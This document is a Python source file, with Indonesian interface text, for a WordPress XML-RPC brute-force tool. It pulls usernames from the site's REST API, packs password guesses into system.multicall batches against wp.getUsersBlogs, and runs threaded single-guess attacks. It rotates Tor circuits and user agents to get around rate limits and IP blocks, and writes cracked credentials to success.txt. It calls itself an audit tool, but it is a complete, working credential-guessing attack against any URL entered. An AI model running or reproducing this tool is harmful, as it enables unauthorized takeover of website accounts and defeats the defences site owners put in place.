#!/usr/bin/env python3
import os
import sys
import random
import time
import requests
import argparse
import threading
from stem import Signal
from stem.control import Controller
from termcolor import colored

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# =========================== CONFIG ===========================
tor_proxy = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)",
    "curl/8.14.1"
]
# ===============================================================
sys.stdout.write("\x1b]2;Ghost-RPC MODE - By Official Marz57\x07")
sys.stdout.flush()

def clear_screen():
    os.system("clear")

def print_logo():
    print(colored(r"""
 __        __   _ _      _   _      _                 _ 
 \ \      / /__| | | ___| | | |_ __(_)_   _____ _ __ | |
  \ \ /\ / / _ \ | |/ _ \ | | | '__| \ \ / / _ \ '_ \| |
   \ V  V /  __/ | |  __/ |_| | |  | |\ V /  __/ | | |_|
    \_/\_/ \___|_|_|\___|\___/|_|  |_| \_/ \___|_| |_(_)
        XML-RPC Bruteforce | by OfficialMarz57
""", "cyan"))

def session(use_tor):
    s = requests.Session()
    s.trust_env = False
    s.headers.update({
        "User-Agent": random.choice(user_agents)
    })
    if use_tor:
        s.proxies.update(tor_proxy)
    return s

def get_ip(use_tor):
    try:
        s = session(use_tor)
        r = s.get("http://icanhazip.com", timeout=10)
        r.raise_for_status()
        return r.text.strip()
    except Exception as e:
        return f"Tidak bisa ambil IP: {e}"

def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        return True
    except Exception as e:
        print(colored(f"[!] Gagal mengganti IP TOR: {e}", "red"))
        return False




#----------------- bagian 2 -------------------------#




def scan_wp_usernames(url, use_tor):
    """Mencoba mengambil daftar username via WordPress REST API secara otomatis"""
    usernames = []
    base_url = url.split("/xmlrpc.php")[0]
    api_url = f"{base_url}/wp-json/wp/v2/users"
    
    try:
        s = session(use_tor)
        r = s.get(api_url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            for user in data:
                if "slug" in user:
                    usernames.append(user["slug"])
    except:
        pass
    return usernames

def check_xmlrpc(url, use_tor):
    clear_screen()
    print_logo()
    print(colored("[*] Mengecek XML-RPC...", "cyan"))
    print(colored(f"[*] Target: {url}", "yellow"))
    print(colored(f"[*] Mode: {'TOR' if use_tor else 'DIRECT'}", "cyan"))
    print(colored(f"[*] IP: {get_ip(use_tor)}", "cyan"))
    print()

    try:
        s = session(use_tor)
        r = s.get(url, timeout=15)

        print(colored(f"HTTP Status : {r.status_code}", "blue"))
        print(colored(f"Server      : {r.headers.get('Server', '-')}", "blue"))
        print(colored(f"Allow       : {r.headers.get('Allow', '-')}", "blue"))
        print(colored(f"Content-Type: {r.headers.get('Content-Type', '-')}", "blue"))
        print()

        if r.status_code == 405 and "POST" in r.headers.get("Allow", ""):
            print(colored("[✔] XML-RPC aktif dan endpoint menerima POST.", "green"))
        else:
            print(colored(f"[!] Endpoint memberikan HTTP {r.status_code}.", "yellow"))

        print(colored("\n[*] Mendeteksi ketersediaan method...", "cyan"))
        payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""
        headers = {'Content-Type': 'text/xml'}
        r_method = s.post(url, data=payload, headers=headers, timeout=15)
        if "wp.getUsersBlogs" in r_method.text:
            print(colored("[✔] Method wp.getUsersBlogs tersedia.", "green"))
        else:
            print(colored("[!] Method dibatasi atau di-block.", "yellow"))

    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))

    input("\nTekan ENTER untuk kembali...")

def test_rate_limit(url, use_tor, count):
    clear_screen()
    print_logo()
    print(colored("[*] Pengujian rate limit XML-RPC", "cyan"))
    print(colored(f"[*] Target: {url}", "yellow"))
    print(colored(f"[*] Mode : {'TOR' if use_tor else 'DIRECT'}", "cyan"))
    print(colored(f"[*] IP   : {get_ip(use_tor)}", "cyan"))
    print(colored(f"[*] Request: {count}", "cyan"))
    print()

    payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""

    headers = {"Content-Type": "text/xml"}
    s = session(use_tor)
    results = {}

    for i in range(1, count + 1):
        try:
            start = time.time()
            headers["User-Agent"] = random.choice(user_agents)
            r = s.post(url, data=payload, headers=headers, timeout=15)
            elapsed = time.time() - start
            results[r.status_code] = results.get(r.status_code, 0) + 1

            print(f"[{i:02d}/{count}] HTTP {r.status_code} {elapsed:.2f}s")

            if r.status_code == 429:
                print(colored("[!] Server mulai menerapkan rate limiting.", "yellow"))
                break
            time.sleep(1)
        except Exception as e:
            print(colored(f"[!] Error: {e}", "red"))
            break

    print()
    print(colored("=== Ringkasan ===", "cyan"))
    for status, total in sorted(results.items()):
        print(f"HTTP {status}: {total} request")
    input("\nTekan ENTER untuk kembali...")




#----------------------- bagian 3 -----------------------




# ==================== CORE BRUTEFORCE LOGIC ====================

def build_multicall_payload(username, passwords):
    entries = ""
    for pwd in passwords:
        entries += f"""
        <value>
            <struct>
                <member><name>methodName</name>
                    <value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name>
                    <value><array><data>
                        <value><array><data>
                            <value><string>{username}</string></value>
                            <value><string>{pwd}</string></value>
                        </data></array></value>
                    </data></array></value>
            </struct>
        </value>"""
    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>{entries}</data></array></value></param></params>
</methodCall>"""

def single_payload(username, password):
    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""

def try_batch_multicall(s, url, username, batch):
    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
    xml = build_multicall_payload(username, batch)
    try:
        r = s.post(url, data=xml, headers=headers, timeout=15)
        if r.status_code == 200:
            responses = r.text.split('<struct>')[1:] if "<struct>" in r.text else [r.text]
            for pwd, response in zip(batch, responses):
                print(f"🔍 {username}:{pwd}")
                if "isAdmin" in response or "blogid" in response:
                    print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                    with open("success.txt", "a") as out:
                        out.write("----------------------------------------------\n")
                        out.write(f"host     : {url}\n")
                        out.write(f"username : {username}\n")
                        out.write(f"password : {pwd}\n")
                        out.write("----------------------------------------------\n\n")

                    return True
        else:
            print(colored(f"[!] Status HTTP {r.status_code}", 'yellow'))
    except Exception as e:
        print(colored(f"[!] Error: {e}", 'red'))
    return False

def try_single(s, url, username, password):
    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
    xml = single_payload(username, password)
    try:
        # TAMBAHKAN verify=False DI SINI JUGA
        r = s.post(url, data=xml, headers=headers, timeout=15, verify=False)
        print(f"🔍 {username}:{password}")
        if "isAdmin" in r.text or "blogid" in r.text:
            print(colored(f"[+] Berhasil: {username}:{password}", 'green'))
            with open("success.txt", "a") as out:
                out.write("----------------------------------------------\n")
                out.write(f"host     : {url}\n")
                out.write(f"username : {username}\n")
                out.write(f"password : {password}\n")
                out.write("----------------------------------------------\n\n")

            return True
    except Exception as e:
        print(colored(f"[!] Error: {e}", 'red'))
    return False





#------------------------ bagian 4 ------------------------#




def run_bruteforce(url, use_tor, target_usernames):
    clear_screen()
    print_logo()
    print(colored("=== MENU BRUTEFORCE ===", "cyan"))
    print(colored(f"[*] Target Host  : {url}", "yellow"))
    print(colored(f"[*] Mode Koneksi : {'TOR' if use_tor else 'DIRECT'}", "cyan"))
    
    current_ip = get_ip(use_tor)
    print(colored(f"[*] IP Awal      : {current_ip}", "cyan"))
    print()

    if target_usernames:
        print(colored(f"[!] Terdeteksi {len(target_usernames)} target username otomatis: {', '.join(target_usernames)}", "green"))
        use_auto = input("Gunakan daftar username otomatis ini? [Y/n]: ").strip().lower()
        if use_auto != 'n':
            active_users = target_usernames
        else:
            single_user = input("Masukkan Username Target Manual: ").strip()
            active_users = [single_user] if single_user else []
    else:
        single_user = input("Masukkan Username Target Manual: ").strip()
        active_users = [single_user] if single_user else []

    if not active_users:
        input(colored("\n[!] Tidak ada username untuk diserang. Tekan ENTER...", "red"))
        return

    wordlist_path = input("Masukkan Path Wordlist: ").strip()
    if not os.path.exists(wordlist_path):
        input(colored("\n[!] File wordlist tidak ditemukan! Tekan ENTER...", "red"))
        return

    mode = input("Pilih Mode Brute [1. multicall (default) / 2. single]: ").strip()
    mode = "single" if mode == "2" else "multicall"

    threads = 3
    if mode == "single":
        t_input = input("Jumlah Threads [default 3]: ").strip()
        if t_input:
            try: threads = int(t_input)
            except ValueError: pass

    with open(wordlist_path, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    # Validasi awal jalur TOR sebelum menyerang
    if use_tor:
        print(colored("[*] Memvalidasi kestabilan jalur TOR ke target sebelum memulai...", "yellow"))
        init_ready = False
        while not init_ready:
            check_s = session(use_tor)
            try:
                r_test = check_s.head(url, timeout=7, verify=False)
                if r_test.status_code:
                    init_ready = True
                    check_s.close()
            except:
                check_s.close()
                print(colored(f"[!] IP Awal [{current_ip}] memblokir target. Mencari sirkuit TOR baru...", "red"))
                if renew_tor_ip():
                    time.sleep(4)
                    current_ip = get_ip(use_tor)
        print(colored(f"🌐 [JALUR AMAN] Siap menyerang dengan IP: {current_ip}", "green"))

    print(colored(f"\n[*] Menjalankan serangan ke {url}...", "yellow"))
    s = session(use_tor)
    success_flag = False

    for username in active_users:
        if success_flag:
            break
        print(colored(f"\n[*] Memulai serangan pada user: '{username}' ({len(passwords)} password)...", "yellow"))
        
        if mode == "multicall":
            batch_size = 5
            for i in range(0, len(passwords), batch_size):
                batch = passwords[i:i+batch_size]
                current_batch_num = (i // batch_size) + 1
                
                print(colored(f"🔁 Batch {current_batch_num} | User: {username} | [IP Saat Ini: {current_ip}]", "cyan"))
                
                headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
                xml = build_multicall_payload(username, batch)
                need_rotation = False
                
                try:
                    r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
                    if r.status_code == 200:
                        responses = r.text.split('<struct>')[1:] if "<struct>" in r.text else [r.text]
                        for pwd, response in zip(batch, responses):
                            print(f"🔍 {username}:{pwd}")
                            if "isAdmin" in response or "blogid" in response:
                                print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                with open("success.txt", "a") as out:
                                    out.write("----------------------------------------------\n")
                                    out.write(f"host     : {url}\n")
                                    out.write(f"username : {username}\n")
                                    out.write(f"password : {pwd}\n")
                                    out.write("----------------------------------------------\n\n")
                                success_flag = True
                                break
                        if success_flag: break
                    elif r.status_code == 429:
                        print(colored("[!] Server menerapkan Rate Limit (HTTP 429).", "yellow"))
                        need_rotation = True
                    else:
                        print(colored(f"[!] Server merespon HTTP {r.status_code}", "yellow"))
                except Exception as e:
                    print(colored("[!] Koneksi terputus/terblokir oleh target.", "red"))
                    need_rotation = True
                
                if use_tor and need_rotation:
                    print(colored(f"\n⚠️  [TOR ROTATION] Memicu pergantian IP lama [{current_ip}]...", "yellow"))
                    tor_ready = False
                    while not tor_ready:
                        if renew_tor_ip():
                            s.close()
                            print(colored("[*] Sirkuit TOR diperbarui. Memvalidasi kestabilan HTTPS ke target...", "yellow"))
                            for retry in range(3):
                                time.sleep(2)
                                check_s = session(use_tor)
                                try:
                                    r_test = check_s.head(url, timeout=6, verify=False)
                                    if r_test.status_code: 
                                        current_ip = get_ip(use_tor)
                                        tor_ready = True
                                        check_s.close()
                                        break
                                except:
                                    check_s.close()
                            if tor_ready: break
                        time.sleep(3)
                    s = session(use_tor)
                    print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}", "green"))
                
                time.sleep(random.uniform(1.0, 2.5))







#-------------------- bagian 4-B-----------------#




        elif mode == "single":
            idx = 0
            while idx < len(passwords):
                if success_flag: break
                
                batch_pwds = passwords[idx:idx+threads]
                window_count = (idx // threads) + 1
                print(colored(f"\n🚀 Menjalankan Thread Window {window_count} | [IP Saat Ini: {current_ip}]", "cyan"))
                
                stop_event = threading.Event()
                lock = threading.Lock()
                errors_detected = []
                
                def worker(pwd):
                    if stop_event.is_set(): return
                    headers = {'Content-Type': 'text/xml', 'User-Agent': random.choice(user_agents)}
                    xml = single_payload(username, pwd)
                    try:
                        r = s.post(url, data=xml, headers=headers, timeout=20, verify=False)
                        if r.status_code == 200:
                            print(f"🔍 {username}:{pwd}")
                            if "isAdmin" in r.text or "blogid" in r.text:
                                with lock:
                                    print(colored(f"[+] Berhasil: {username}:{pwd}", 'green'))
                                    with open("success.txt", "a") as out:
                                        out.write("----------------------------------------------\n")
                                        out.write(f"host     : {url}\n")
                                        out.write(f"username : {username}\n")
                                        out.write(f"password : {pwd}\n")
                                        out.write("----------------------------------------------\n\n")
                                    stop_event.set()
                                    nonlocal success_flag
                                    success_flag = True
                        elif r.status_code == 429:
                            with lock: errors_detected.append("rate_limit")
                        else:
                            print(f"🔍 {username}:{pwd} -> HTTP {r.status_code}")
                    except:
                        with lock: errors_detected.append("blocked")
                    time.sleep(random.uniform(1.0, 2.0))

                threads_list = []
                for pwd in batch_pwds:
                    t = threading.Thread(target=worker, args=(pwd,))
                    threads_list.append(t)
                    t.start()
                
                for x in threads_list: x.join()
                
                if use_tor and errors_detected:
                    print(colored(f"\n⚠️  [TOR ROTATION] Terdeteksi eror/blokir pada window ini. Mengganti sirkuit [{current_ip}]...", "yellow"))
                    tor_ready = False
                    while not tor_ready:
                        if renew_tor_ip():
                            s.close()
                            print(colored("[*] Sirkuit TOR diperbarui. Memvalidasi kestabilan HTTPS ke target...", "yellow"))
                            for retry in range(3):
                                time.sleep(2)
                                check_s = session(use_tor)
                                try:
                                    r_test = check_s.head(url, timeout=6, verify=False)
                                    if r_test.status_code:
                                        current_ip = get_ip(use_tor)
                                        tor_ready = True
                                        check_s.close()
                                        break
                                except:
                                    check_s.close()
                            if tor_ready: break
                        time.sleep(3)
                    s = session(use_tor)
                    print(colored(f"🌐 [TOR SUCCESS] IP Baru Aktif: {current_ip}", "green"))
                    print(colored("[*] Mengulang kembali pengecekan password yang sempat gagal...", "yellow"))
                else:
                    idx += threads

    if success_flag:
        print(colored("\n[+] Bruteforce Sukses! Hasil tersimpan di success.txt", "green"))
    else:
        print(colored("\n[-] Bruteforce Selesai! Tidak ada password yang cocok.", "red"))
    input("\nTekan ENTER untuk kembali...")









#-------------------- bagian 5 ------------------_#



def tor_menu():
    clear_screen()
    print_logo()
    print(colored("=== TOR ===", "cyan"))
    print()
    print(f"IP TOR saat ini: {get_ip(True)}")
    print()
    choice = input(" [1] Renew TOR circuit\n [2] Check TOR IP\n [0] Kembali\n\nPilih: ").strip()
    if choice == "1":
        clear_screen()
        print_logo()
        if renew_tor_ip():
            time.sleep(3)
            print(colored("[✔] Circuit TOR diperbarui.", "green"))
            print(colored(f"🌐 IP Baru: {get_ip(True)}", "cyan"))
        else:
            print(colored("[!] Gagal memperbarui circuit TOR.", "red"))
        input("\nTekan ENTER untuk kembali...")
    elif choice == "2":
        clear_screen()
        print_logo()
        print(colored(f"🌐 IP TOR: {get_ip(True)}", "cyan"))
        input("\nTekan ENTER untuk kembali...")

def format_target_url(raw_url):
    """Otomatis memformat input agar selalu berujung pada /xmlrpc.php"""
    url = raw_url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    
    # Hapus tanda slash di paling belakang jika ada
    if url.endswith("/"):
        url = url[:-1]
        
    # Jika user belum mengetik xmlrpc.php, tambahkan otomatis
    if not url.endswith("xmlrpc.php"):
        if url.endswith("xmlrpc"):
            url = url + ".php"
        else:
            url = url + "/xmlrpc.php"
    return url

def main_menu(initial_url):
    # Otomatis rapikan URL di awal start CLI
    url = format_target_url(initial_url)
    use_tor = False
    
    print(colored(f"[*] Menghubungkan ke target: {url}", "cyan"))
    print(colored("[*] Mencoba memindai username target secara otomatis...", "yellow"))
    target_usernames = scan_wp_usernames(url, use_tor)
    
    while True:
        clear_screen()
        print_logo()
        print(colored("========================================", "cyan"))
        print(colored(" XML-RPC AUDIT & BRUTEFORCE TOOL", "cyan"))
        print(colored("========================================", "cyan"))
        print()

        mode = "TOR" if use_tor else "DIRECT"
        print(f"Target URL  : {colored(url, 'yellow')}")
        
        if target_usernames:
            users_str = colored(", ".join(target_usernames), "green")
            print(f"Target Users: [{users_str}] (Otomatis Terdeteksi)")
        else:
            print(f"Target Users: [{colored('Kosong / Proteksi REST API', 'red')}]")
            
        print(f"Connection  : {colored(mode, 'green')}")
        print(f"Public IP   : {get_ip(use_tor)}")
        print()

        print(" [1] Switch ke Direct Connection")
        print(" [2] Switch ke TOR")
        print(" [3] Cek XML-RPC & Validasi Method")
        print(" [4] Test Rate Limit XML-RPC")
        print(" [5] Pengaturan TOR (Circuit / IP)")
        print(" [6] START BRUTEFORCE (With TOR)")
        print(" [7] START BRUTEFORCE (Without TOR)")
        print(" [8] Ganti Host / Target URL")
        print(" [9] Masukkan / Edit Daftar Username Target")
        print(" [0] Keluar")
        print()

        choice = input("Pilih menu: ").strip()

        if choice == "1":
            use_tor = False
        elif choice == "2":
            use_tor = True
        elif choice == "3":
            check_xmlrpc(url, use_tor)
        elif choice == "4":
            clear_screen()
            print_logo()
            value = input("Jumlah request pengujian [default 10]: ").strip()
            try:
                count = int(value) if value else 10
                count = max(1, min(count, 20))
                test_rate_limit(url, use_tor, count)
            except ValueError:
                input("\nJumlah request tidak valid. Tekan ENTER...")
        elif choice == "5":
            tor_menu()
        elif choice == "6":
            run_bruteforce(url, use_tor=True, target_usernames=target_usernames)
        elif choice == "7":
            run_bruteforce(url, use_tor=False, target_usernames=target_usernames)
        elif choice == "8":
            clear_screen()
            print_logo()
            new_target = input("Masukkan Target URL baru: ").strip()
            if new_target:
                url = format_target_url(new_target)
                print(colored(f"[*] Memindai username pada target baru: {url}", "yellow"))
                target_usernames = scan_wp_usernames(url, use_tor)
            input("\nTekan ENTER untuk kembali...")
        elif choice == "9":
            clear_screen()
            print_logo()
            print("--- Kustomisasi Daftar Username Target ---")
            print("Masukkan username pisahkan dengan koma (contoh: admin, user1, webmaster)")
            manual_input = input("Username: ").strip()
            if manual_input:
                target_usernames = [u.strip() for u in manual_input.split(",") if u.strip()]
                print(colored(f"\n[✔] Berhasil memuat {len(target_usernames)} target username!", "green"))
            input("\nTekan ENTER untuk kembali...")
        elif choice == "0":
            clear_screen()
            print(colored("Keluar.", "cyan"))
            break
        else:
            input("\nPilihan tidak valid. Tekan ENTER untuk kembali...")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress XML-RPC Audit & Bruteforce Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. example.com atau example.com/xmlrpc.php)")
    args = parser.parse_args()

    # Memanggil main menu dengan pembersihan URL otomatis sejak argument CLI masuk
    main_menu(args.url)

